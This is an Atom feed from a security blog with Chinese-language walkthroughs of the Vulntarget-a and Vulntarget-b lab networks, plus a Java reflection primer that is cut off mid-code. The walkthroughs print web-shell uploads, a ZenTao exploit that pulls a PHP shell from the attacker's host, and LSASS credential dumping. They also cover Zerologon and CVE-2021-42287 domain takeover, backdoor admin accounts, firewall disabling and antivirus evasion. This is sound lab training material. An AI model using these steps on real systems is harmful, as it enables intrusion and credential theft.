<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Polo&#39;s Blog</title>
  
  
  <link href="https://polosec.github.io/atom.xml" rel="self"/>
  
  <link href="https://polosec.github.io/"/>
  <updated>2022-03-31T15:11:47.619Z</updated>
  <id>https://polosec.github.io/</id>
  
  <author>
    <name>Polo</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Vulntarget-a WriteUp</title>
    <link href="https://polosec.github.io/2022/03/31/Vulntarget-a-WriteUp/"/>
    <id>https://polosec.github.io/2022/03/31/Vulntarget-a-WriteUp/</id>
    <published>2022-03-31T15:11:45.000Z</published>
    <updated>2022-03-31T15:11:47.619Z</updated>
    
    <content type="html"><![CDATA[<h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><p><a href="http://192.168.248.141/">http://192.168.248.141/</a></p><p>通达OA 直接尝试工具利用</p><p><img src="http://cdn.polowong.top/image-20220329102838067.png" alt="image-20220329102838067"></p><p>上蚁剑看到system权限。。直接不用提权了</p><p><img src="http://cdn.polowong.top/image-20220329103224207.png" alt="image-20220329103224207"></p><p>上cs进行内网渗透与信息收集</p><h2 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h2><p>上传fscan，扫了一下192.168.248网段没其他收获，扫一下另一张网卡10网段的主机</p><p>通过tailor scan 和nbtscan发现了10.0.20.99主机</p><p><img src="http://cdn.polowong.top/image-20220329105152789.png" alt="image-20220329105152789"></p><p><img src="http://cdn.polowong.top/image-20220329105204805.png" alt="image-20220329105204805"></p><h2 id="查看当前主机是否在域内"><a href="#查看当前主机是否在域内" class="headerlink" title="查看当前主机是否在域内"></a>查看当前主机是否在域内</h2><p><img src="http://cdn.polowong.top/image-20220329105324361.png" alt="image-20220329105324361"></p><p>net time /domain也报错，判断当前机器不在域内，直接打另一张网卡的99主机。</p><h2 id="凭证获取"><a href="#凭证获取" class="headerlink" title="凭证获取"></a>凭证获取</h2><p>直接mimikatz 获得密码明文 admin</p><p><img src="http://cdn.polowong.top/image-20220329105444391.png" alt="image-20220329105444391"></p><h1 id="内网主机1"><a href="#内网主机1" class="headerlink" title="内网主机1"></a>内网主机1</h1><p>ip地址10.0.20.99，从外网主机开个socks代理</p><p><img src="http://cdn.polowong.top/image-20220329105831122.png" alt="image-20220329105831122"></p><p><img src="http://cdn.polowong.top/image-20220329105841361.png" alt="image-20220329105841361"></p><p>浏览器访问20.99,hello world 扫了下目录只有phpinfo，暴露了绝对路径。 没有其他利用点，但是发现开了6379端口，</p><h2 id="方式一-绝对路径-redis写shell"><a href="#方式一-绝对路径-redis写shell" class="headerlink" title="方式一  绝对路径 redis写shell"></a>方式一  绝对路径 redis写shell</h2><p>参考链接<a href="http://wjlshare.com/archives/1283">http://wjlshare.com/archives/1283</a></p><p><img src="http://cdn.polowong.top/image-20220329213339815.png" alt="image-20220329213339815"></p><p><img src="http://cdn.polowong.top/image-20220329214114503.png" alt="image-20220329214114503"></p><p>访问1.php</p><p><img src="http://cdn.polowong.top/image-20220329214128176.png" alt="image-20220329214128176"></p><p><img src="http://cdn.polowong.top/image-20220329214343222.png" alt="image-20220329214343222"></p><p>system权限。。</p><h3 id="方式二-一键利用脚本端口转发上线"><a href="#方式二-一键利用脚本端口转发上线" class="headerlink" title="方式二 一键利用脚本端口转发上线"></a>方式二 一键利用脚本端口转发上线</h3><p>待补充，全部打完后再弄</p><h2 id="主机信息搜集"><a href="#主机信息搜集" class="headerlink" title="主机信息搜集"></a>主机信息搜集</h2><p>双网卡，10.0.20.99 10.0.10.111</p><p>查询是否在域</p><p><img src="http://cdn.polowong.top/image-20220329215118847.png" alt="image-20220329215118847"></p><p>查看域管理员</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group <span class="string">&quot;enterprise admins&quot;</span> /domain</span><br></pre></td></tr></table></figure><p><img src="http://cdn.polowong.top/image-20220329215346386.png" alt="image-20220329215346386"></p><p>尝试获取dc ip</p><p><img src="http://cdn.polowong.top/image-20220329215141334.png" alt="image-20220329215141334"></p><p>dc ip 10.0.10.110</p><p>看下arp缓存</p><p>无其他可用信息，fscan扫描一下，也是只有DC信息，不管了，先上cs再说。</p><h2 id="凭证收集"><a href="#凭证收集" class="headerlink" title="凭证收集"></a>凭证收集</h2><p><img src="http://cdn.polowong.top/image-20220329215759988.png" alt="image-20220329215759988"></p><p>先上传procdump dump下lsass文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br></pre></td></tr></table></figure><p>注意一点，上传的mimikatz是32位，使用掩日免杀编译的时候也是32位，但是到了本地解的时候需要使用64位的mimikatz。</p><p>解一下hash</p><p>得到主机账号密码 win2016 Admin#123</p><h2 id="上线cs"><a href="#上线cs" class="headerlink" title="上线cs"></a>上线cs</h2><p>第二台主机上线cs绕了很多弯路，说一下历程吧。</p><p>首先是win7开防火墙，win7禁用了管理员，使用cs的system权限修改管理员密码，然后3389上去编辑本地策略取消禁用管理员。</p><p>使用命令<strong>net user Administrator /active:yes</strong>激活管理员失败。</p><p>win7允许管理员登陆后，一直没上线，考虑是防火墙原因，netsh advfirewall set  currentprofile state off 关闭了win7的防火墙，同样关闭了win2016的防火墙</p><p>接下来是pivot中继上线cs，大坑，因为中继上线无法生成shellcode，但是目标主机有defender，只能想办法免杀，然而掩日并不能免杀cs的exe文件，所以只能采用<strong>web-delivery</strong>方法获取<strong>32位</strong>shellcode然后手动免杀，然而python形式的shellcode获取并解码过后shellcode格式是”\\xff”形式，需要去掉一个反斜线，要不然也上不了线，踩了大坑。获取shellcode后使用掩日免杀，<strong>编译去掉64位编译选项</strong>，生成，上传，<strong>上线</strong>。</p><p><img src="http://cdn.polowong.top/image-20220331155404810.png" alt="image-20220331155404810"></p><h1 id="域控"><a href="#域控" class="headerlink" title="域控"></a>域控</h1><p>根据上面收集的信息，dc为10.0.10.110，搞个代理访问到DC先,直接通过cs再开一个socks，proxifier/proxychains配置代理链</p><h3 id="CVE-2020-1472"><a href="#CVE-2020-1472" class="headerlink" title="CVE-2020-1472"></a>CVE-2020-1472</h3><p><img src="http://cdn.polowong.top/image-20220331222351102.png" alt="image-20220331222351102">先利用漏洞把密码重置为空，然后dump出来hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 secretsdump.py vulntarget.com&#x2F;win2019\$@10.0.10.110 -no-pass</span><br></pre></td></tr></table></figure><p><img src="http://cdn.polowong.top/image-20220331222649024.png" alt="image-20220331222649024"></p><p>然后利用smbexec拿到shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 smbexec.py  -hashes ad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15 vulntarget.com&#x2F;administrator@10.0.10.110</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="http://cdn.polowong.top/image-20220331222917115.png" alt="image-20220331222917115"></p><p>添加用户，添加管理员</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">net user polowong Admin@polo123 &#x2F;add</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;net localgroup administrators polowong &#x2F;add</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>开3389</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\TerminalServer\WinStations\RDP-Tcp&quot; &#x2F;t REG_DWORD &#x2F;v portnumber &#x2F;d 3389 &#x2F;f</span><br><span class="line">wmic RDTOGGLE WHERE ServerName&#x3D;&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1</span><br><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allow</span><br></pre></td></tr></table></figure><p><img src="http://cdn.polowong.top/image-20220331224750967.png" alt="image-20220331224750967"></p><h3 id="hash还原"><a href="#hash还原" class="headerlink" title="hash还原"></a>hash还原</h3><p>如果机器账户<code>hash</code>长时间为空，可能会导致脱域，对内网的使用产生重大影响，因此拿到权限的第一时间需要把<code>hash</code>重置回去。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.save</span><br><span class="line">reg save HKLM\SAM sam.save</span><br><span class="line">reg save HKLM\SECURITY security.save</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后在当前shell目录生成这三个文件，c/windows/system32</p><p>通过mstsc拷回来，考到kali，使用secretdump解析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL</span><br></pre></td></tr></table></figure><p><img src="http://cdn.polowong.top/image-20220331230022740.png" alt="image-20220331230022740"></p><p>使用脚本</p><p><a href="https://github.com/risksense/zerologon">https://github.com/risksense/zerologon</a></p><p>还原hash</p><p>proxychains python3 reinstall_original_pw.py  win2019 10.0.10.110 70312b76f3ee31850203aff8c224f454</p><p><img src="http://cdn.polowong.top/image-20220331230526502.png" alt="image-20220331230526502"></p><p>可以了，测试下用原来的密码也可以登录，并且用secretdump no-pass 利用失败</p><p><img src="http://cdn.polowong.top/image-20220331230759230.png" alt="image-20220331230759230"></p><h3 id="上线cs-1"><a href="#上线cs-1" class="headerlink" title="上线cs"></a>上线cs</h3><p>一样的方法拿出shellcode然后做免杀，上传上线</p><p><img src="http://cdn.polowong.top/image-20220331230913354.png" alt="image-20220331230913354"></p><p><img src="http://cdn.polowong.top/image-20220331230922379.png" alt="image-20220331230922379"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;外网打点&quot;&gt;&lt;a href=&quot;#外网打点&quot; class=&quot;headerlink&quot; title=&quot;外网打点&quot;&gt;&lt;/a&gt;外网打点&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;http://192.168.248.141/&quot;&gt;http://192.168.248.141/&lt;/a&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Vulntarget-b WriteUp</title>
    <link href="https://polosec.github.io/2022/03/24/Vulntarget-b-WriteUp/"/>
    <id>https://polosec.github.io/2022/03/24/Vulntarget-b-WriteUp/</id>
    <published>2022-03-24T08:55:56.000Z</published>
    <updated>2022-03-24T08:56:16.139Z</updated>
    
    <content type="html"><![CDATA[<h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><h2 id="外部信息搜集"><a href="#外部信息搜集" class="headerlink" title="外部信息搜集"></a>外部信息搜集</h2><p>目标地址：<a href="http://192.168.248.140:81/">http://192.168.248.140:81/</a></p><p>nmap扫描后发现可利用端口为3306和81，分别是mysql与http服务</p><p><img src="http://cdn.polowong.top/image-20220323102224709.png" alt="image-20220323102224709"></p><p>发现极致cms，尝试从网上搜索相关漏洞，弱口令，默认后台地址</p><h2 id="web-cms渗透"><a href="#web-cms渗透" class="headerlink" title="web cms渗透"></a>web cms渗透</h2><p><img src="http://cdn.polowong.top/image-20220323102317983.png" alt="image-20220323102317983"></p><p>弱口令admin/admin123进入后台</p><p>进入后台后首先尝试上传，允许上传文件类型添加php后多次尝试依旧上传失败，尝试其他利用方法，参考链接<a href="https://cn-sec.com/archives/318500.html%EF%BC%8C%E4%BD%BF%E7%94%A8%E7%9A%84%E6%96%B9%E6%B3%95%E4%B8%BA%E6%B7%BB%E5%8A%A0%E6%8F%92%E4%BB%B6%E4%BF%AE%E6%94%B9%E6%A8%A1%E6%9D%BF%E4%BB%A3%E7%A0%81%EF%BC%8C%E5%B5%8C%E5%85%A5php%E4%BB%A3%E7%A0%81%E3%80%82">https://cn-sec.com/archives/318500.html，使用的方法为添加插件修改模板代码，嵌入php代码。</a></p><p><img src="http://cdn.polowong.top/image-20220323102435446.png" alt="image-20220323102435446"></p><p><img src="http://cdn.polowong.top/image-20220323102706668.png" alt="image-20220323102706668"></p><p>配置好密码后，可以看到现在已经有了网站模板编辑权限</p><p><img src="http://cdn.polowong.top/image-20220323102745249.png" alt="image-20220323102745249"></p><p>尝试在index.php嵌入一句话木马，成功。</p><p><img src="http://cdn.polowong.top/image-20220323102853188.png" alt="image-20220323102853188"></p><p><img src="http://cdn.polowong.top/image-20220323102844337.png" alt="image-20220323102844337"></p><p>上蚁剑，可以连接，但是无法执行命令，考虑绕过disable_function</p><p><img src="http://cdn.polowong.top/image-20220323103029788.png" alt="image-20220323103029788"></p><h2 id="disable-function绕过"><a href="#disable-function绕过" class="headerlink" title="disable_function绕过"></a>disable_function绕过</h2><p>使用蚁剑插件绕过disable_function</p><p><img src="http://cdn.polowong.top/image-20220323103148822.png" alt="image-20220323103148822"></p><h2 id="主机信息搜集"><a href="#主机信息搜集" class="headerlink" title="主机信息搜集"></a>主机信息搜集</h2><p>ifconfig/ip a 无回显，先上msf看一下网络信息</p><p><img src="http://cdn.polowong.top/image-20220323110057058.png" alt="image-20220323110057058"></p><p>有两个网段，192.168.248.0/24 192.168.159.0/24</p><p>添加路由，启动socks代理</p><p><img src="http://cdn.polowong.top/image-20220323110712529.png" alt="image-20220323110712529"><img src="http://cdn.polowong.top/image-20220323110727447.png" alt="image-20220323110727447"></p><p>配置proxifier，尝试访问159网段</p><p><img src="http://cdn.polowong.top/image-20220323111007864.png" alt="image-20220323111007864"></p><p>没问题，进行159网段的信息搜集</p><p>使用TailorScan</p><p><img src="http://cdn.polowong.top/image-20220323124220309.png" alt="image-20220323124220309"></p><p>发现192.168.159.129:8080</p><p>访问发现是禅道CMS</p><h1 id="内网主机1"><a href="#内网主机1" class="headerlink" title="内网主机1"></a>内网主机1</h1><p>192.168.159.129主机开放了8080与3306端口，分别是http与mysql服务，8080端口部署了禅道系统。</p><h2 id="web-渗透"><a href="#web-渗透" class="headerlink" title="web 渗透"></a>web 渗透</h2><p>漏洞利用：<a href="https://blog.csdn.net/qq_36197704/article/details/109385695">https://blog.csdn.net/qq_36197704/article/details/109385695</a></p><p>弱口令admin/Admin123进入后台</p><p>由于漏洞利用需要访问服务器文件，该主机不出网，所以需要在第一台centos起一个web服务放payload</p><p>python -m SimpleHTTPServer 1234</p><p><img src="http://cdn.polowong.top/image-20220323125354747.png" alt="image-20220323125354747"></p><p>访问后文件存在，进行下一步利用</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.129:8080/index.php?m=client&amp;f=download&amp;version=1&amp;link=SFRUUDovLzE5Mi4xNjguMTU5LjEzMDoxMjM0LzEucGhw</span><br></pre></td></tr></table></figure><p>上传完成后尝试访问</p><p><a href="http://192.168.159.129:8080/data/client/1/1.php">http://192.168.159.129:8080/data/client/1/1.php</a></p><p><img src="http://cdn.polowong.top/image-20220323125714445.png" alt="image-20220323125714445"></p><p>没问题，上蚁剑</p><p><img src="http://cdn.polowong.top/image-20220323140808768.png" alt="image-20220323140808768"></p><h2 id="上线msf"><a href="#上线msf" class="headerlink" title="上线msf"></a>上线msf</h2><p>看一下有哪些杀软 tasklist /svc 然后掩日识别一下</p><p><img src="http://cdn.polowong.top/image-20220323142255471.png" alt="image-20220323142255471"></p><p>发现有火绒，尝试上一下msf，由于该机器不出外网，需要在centos使用ew做一下端口转发，并且需要对生成的shellcode进行免杀。</p><h3 id="msf免杀火绒"><a href="#msf免杀火绒" class="headerlink" title="msf免杀火绒"></a>msf免杀火绒</h3><p>使用掩日进行免杀</p><p><img src="http://cdn.polowong.top/image-20220323150056402.png" alt="image-20220323150056402"></p><h3 id="centos配置端口转发"><a href="#centos配置端口转发" class="headerlink" title="centos配置端口转发"></a>centos配置端口转发</h3><p>弱口令ssh进去centos，systemctl stop firewalld.service 关闭防火墙,使用gost进行端口转发</p><p><img src="http://cdn.polowong.top/image-20220323195150318.png" alt="image-20220323195150318"></p><p>centos 1235端口收到的请求将转发至248.133主机的8887端口</p><p><img src="http://cdn.polowong.top/image-20220323150820641.png" alt="image-20220323150820641"></p><p><img src="http://cdn.polowong.top/image-20220323150831092.png" alt="image-20220323150831092"></p><p>运行exe文件</p><p><img src="http://cdn.polowong.top/image-20220323150857570.png" alt="image-20220323150857570"></p><h3 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h3><p>run post/windows/manage/migrate  自动迁移进程</p><h3 id="添加路由与收集网段信息"><a href="#添加路由与收集网段信息" class="headerlink" title="添加路由与收集网段信息"></a>添加路由与收集网段信息</h3><p>可以看到有10.0.10.0/24网段信息，添加路由</p><p><img src="http://cdn.polowong.top/image-20220323195308599.png" alt="image-20220323195308599"></p><p>上传fscan收集信息</p><p><img src="http://cdn.polowong.top/image-20220323195954548.png" alt="image-20220323195954548"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>尝试了几个suggester提供的方法均失败，直接getsystem就可以了，昨天提权失败应该是因为msf没更新</p><p><img src="http://cdn.polowong.top/image-20220324125109952.png" alt="image-20220324125109952"></p><h2 id="dump-hash"><a href="#dump-hash" class="headerlink" title="dump hash"></a>dump hash</h2><p>dump hash需要管理员权限，所以上一步提权，手动尝试添加用户被火绒拦截了，所以只能dump hash</p><p>load kiwi</p><p>creds_all</p><p><img src="http://cdn.polowong.top/image-20220324125928821.png" alt="image-20220324125928821"></p><p>去解一下NTLM HASH</p><p><a href="https://www.objectif-securite.ch/ophcrack">https://www.objectif-securite.ch/ophcrack</a></p><p><img src="http://cdn.polowong.top/image-20220324130046556.png" alt="image-20220324130046556"></p><p>得到密码admin#123,尝试远程桌面登录</p><p><img src="http://cdn.polowong.top/image-20220324130559762.png" alt="image-20220324130559762"></p><p>run post/windows/manage/enable_rdp</p><p><img src="http://cdn.polowong.top/image-20220324130923270.png" alt="image-20220324130923270"></p><p>登陆不上，没有授权，没办法只能去打域控了</p><h2 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h2><p>ip地址10.0.10.99</p><p>arp表</p><p><img src="http://cdn.polowong.top/image-20220324140502446.png" alt="image-20220324140502446"></p><p>fscan信息</p><p><img src="http://cdn.polowong.top/image-20220324140634638.png" alt="image-20220324140634638"></p><p>可以看到已经定位出了DC</p><h3 id="定位域控"><a href="#定位域控" class="headerlink" title="定位域控"></a>定位域控</h3><p>参考</p><p><a href="https://security.tencent.com/index.php/blog/msg/154">https://security.tencent.com/index.php/blog/msg/154</a></p><p>net user /domain</p><p>net time /domain</p><p><img src="http://cdn.polowong.top/image-20220324140716143.png" alt="image-20220324140716143"></p><p>ping一下DC，得到IP地址，可以看到与fscan的扫描结果一致。</p><p><img src="http://cdn.polowong.top/image-20220324141003488.png" alt="image-20220324141003488"></p><h1 id="域控"><a href="#域控" class="headerlink" title="域控"></a>域控</h1><h2 id="CVE-2021-42287"><a href="#CVE-2021-42287" class="headerlink" title="CVE-2021-42287"></a>CVE-2021-42287</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;WazeHell&#x2F;sam-the-admin.git</span><br><span class="line">python3 -m pip install -r requirements.txt</span><br></pre></td></tr></table></figure><p>这个脚本只能在kali使用，kali自带了smbexec</p><p>需要修改源码</p><p><img src="http://cdn.polowong.top/image-20220324144058617.png" alt="image-20220324144058617"></p><p>proxychains python3 sam_the_admin.py “vulntarget.com/win101:admin#123” -dc-ip 10.0.10.100 -shell</p><p><img src="http://cdn.polowong.top/image-20220324144134296.png" alt="image-20220324144134296"></p><h2 id="开3389"><a href="#开3389" class="headerlink" title="开3389"></a>开3389</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\TerminalServer\WinStations\RDP-Tcp&quot; &#x2F;t REG_DWORD &#x2F;v portnumber &#x2F;d 3389 &#x2F;f</span><br><span class="line">wmic RDTOGGLE WHERE ServerName&#x3D;&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1</span><br><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allow</span><br></pre></td></tr></table></figure><p><img src="http://cdn.polowong.top/image-20220324144424453.png" alt="image-20220324144424453"></p><h3 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h3><p>net user polo admin@123 /add</p><p>net localgroup administrators polo /add</p><p><img src="http://cdn.polowong.top/image-20220324144755692.png" alt="image-20220324144755692"></p><p>使用kali的remmina工具登录，mstsc应该是因为ssl配置问题上不去</p><p><img src="http://cdn.polowong.top/image-20220324150243048.png" alt="image-20220324150243048"></p><h3 id="dump-hash-1"><a href="#dump-hash-1" class="headerlink" title="dump hash"></a>dump hash</h3><p>上传procdump，利用42287获得的shell执行下面命令</p><p>procdump64.exe -accepteula -ma lsass.exe lsass.dmp</p><p>然后将得到的lsass.dmp文件拷贝至本地</p><p>本地执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &#96;&#96;&quot;sekurlsa::minidump lsass.dmp&quot;&#96; &#96;&quot;sekurlsa::logonPasswords full&quot;&#96; &#96;exit</span><br></pre></td></tr></table></figure><p><img src="http://cdn.polowong.top/image-20220324164849442.png" alt="image-20220324164849442"></p><p>拿到NTLM-hash结果，尝试解密Administrator 570a9a65db8fba761c1008a51d4c95ab</p><p><img src="http://cdn.polowong.top/image-20220324164957859.png" alt="image-20220324164957859"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;外网打点&quot;&gt;&lt;a href=&quot;#外网打点&quot; class=&quot;headerlink&quot; title=&quot;外网打点&quot;&gt;&lt;/a&gt;外网打点&lt;/h1&gt;&lt;h2 id=&quot;外部信息搜集&quot;&gt;&lt;a href=&quot;#外部信息搜集&quot; class=&quot;headerlink&quot; title=&quot;外部信息搜</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Java安全基础-反射学习</title>
    <link href="https://polosec.github.io/2022/03/08/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-%E5%8F%8D%E5%B0%84%E5%AD%A6%E4%B9%A0/"/>
    <id>https://polosec.github.io/2022/03/08/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-%E5%8F%8D%E5%B0%84%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-03-07T16:29:14.000Z</published>
    <updated>2022-03-07T16:30:27.208Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java执行系统命令"><a href="#Java执行系统命令" class="headerlink" title="Java执行系统命令"></a>Java执行系统命令</h1><h2 id="cmd相关参数"><a href="#cmd相关参数" class="headerlink" title="cmd相关参数"></a>cmd相关参数</h2><p>cmd /c dir 是执行完dir命令后关闭命令窗口。 </p><p>cmd /k dir 是执行完dir命令后不关闭命令窗口。 </p><p>cmd /c start dir 会打开一个新窗口后执行dir指令，原窗口会关闭。 </p><p>cmd /k start dir 会打开一个新窗口后执行dir指令，原窗口不会关闭。</p><h2 id="windows下执行命令的几种方式"><a href="#windows下执行命令的几种方式" class="headerlink" title="windows下执行命令的几种方式"></a>windows下执行命令的几种方式</h2><ol><li>Windows下调用程序</li></ol><blockquote><p>Process proc =Runtime.getRuntime().exec(“exefile”);</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Process proc1 =Runtime.getRuntime().exec(<span class="string">&quot;notepad&quot;</span>);</span><br></pre></td></tr></table></figure></blockquote><ol><li>Windows下调用系统命令</li></ol><blockquote><p>String [] cmd={“cmd”,”/C”,”copy exe1 exe2”};<br>Process proc =Runtime.getRuntime().exec(cmd);</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">String cmd[]=&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/c&quot;</span>,<span class="string">&quot;whoami&quot;</span>&#125;;</span><br><span class="line">   Process proc2=Runtime.getRuntime().exec(cmd);</span><br><span class="line">      InputStream is=proc2.getInputStream();</span><br><span class="line">      BufferedReader br=<span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is));</span><br><span class="line">      String res;</span><br><span class="line">      <span class="keyword">while</span> ((res=br.readLine())!=<span class="keyword">null</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          System.out.println(res);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><ol><li>Windows下调用系统命令并弹出命令行窗口</li></ol><blockquote><p>String [] cmd={“cmd”,”/C”,”start copy exe1 exe2”};<br>Process proc =Runtime.getRuntime().exec(cmd);</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String cmd[]=&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/c&quot;</span>,<span class="string">&quot;start&quot;</span>,<span class="string">&quot;dir&quot;</span>&#125;;</span><br><span class="line">Process proc2=Runtime.getRuntime().exec(cmd);</span><br></pre></td></tr></table></figure><p><img src="http://cdn.polowong.top/image-20220307222310392.png" alt="image-20220307222310392"></p></blockquote><h2 id="Linux下执行命令的几种方式"><a href="#Linux下执行命令的几种方式" class="headerlink" title="Linux下执行命令的几种方式"></a>Linux下执行命令的几种方式</h2><ol><li>Linux下调用程序</li></ol><blockquote><p>Process proc =Runtime.getRuntime().exec(“./exefile”);</p></blockquote><ol><li>Linux下调用系统命令</li></ol><blockquote><p>String [] cmd={“/bin/sh”,”-c”,”ln -s exe1 exe2”};<br>Process proc =Runtime.getRuntime().exec(cmd);</p></blockquote><ol><li>Linux下调用系统命令并弹出命令行窗口</li></ol><blockquote><p>String [] cmd={“/bin/sh”,”-c”,”xterm -e ln -s exe1 exe2”};<br>Process proc =Runtime.getRuntime().exec(cmd);</p></blockquote><h1 id="Java反射相关知识"><a href="#Java反射相关知识" class="headerlink" title="Java反射相关知识"></a>Java反射相关知识</h1><p>先说一个不成熟的结论，个人对Java反射的理解类似python jinja2模板渲染引擎SSTI漏洞中找RCE利用链一样：从当前类找到object类（forName/__base__），在从object类的子类中找到存在命令执行方法的子类(runtime.getruntime()/subclasses())，最后找到命令执行方法(exec/popen)</p><p>Java反射是在运行状态中对于任意一个类都可以找到这个类的类名，构造方法，成员方法，属性。这种动态获取对象属性的机制称为Java的反射机制。</p><h2 id="反射的优点与缺点"><a href="#反射的优点与缺点" class="headerlink" title="反射的优点与缺点"></a>反射的优点与缺点</h2><p><strong>优点：</strong><br>反射机制可以实现动态创建对象和编译，体现出很大的灵活性，特别是在J2EE的开发者他的灵活性就表现得十分明显。例如，在一个大型软件的开发中，当程序被编译后发布，如果以后需要更新某些功能的时候，我们不可能要用户把以前软件的卸载，再重新安装新的版本。采用静态的话，需要把整个程序重新编译一次才可以实现功能的更新，而采用反射机制的话，它就可以不用卸载，只需要在运行时才动态的创建和编译，就可以实现该功能。</p><p><strong>缺点：</strong><br>对性能有影响。反射机制其实是一种解释操作，我们通过告诉JVM，我们希望做什么并且他们组我们的要求。这类操作总是慢于只直接执行相同的操作</p><h2 id="Class类"><a href="#Class类" class="headerlink" title="Class类"></a>Class类</h2><p>Class类是所有类的类，对于普通的对象，新建一个对象的实例如下：</p><p>Demo demo = new Demo();</p><p>但是不能直接用Class cls=new Class();去创建一个class类，因为Class类的构造方法是私有的，不允许被外部调用构建。</p><p>然而我们可以通过其他方法获取到class类：</p><ol><li><p>```java<br>Demo demo=new Demo(); Class cls=demo.getclass();</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. &#96;&#96;&#96;java</span><br><span class="line">   Class cls2&#x3D;Demo.class;</span><br></pre></td></tr></table></figure></li><li><p>```java<br>Class cls3=Class.forName(“com.org.ReflectDemo.Demo”)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 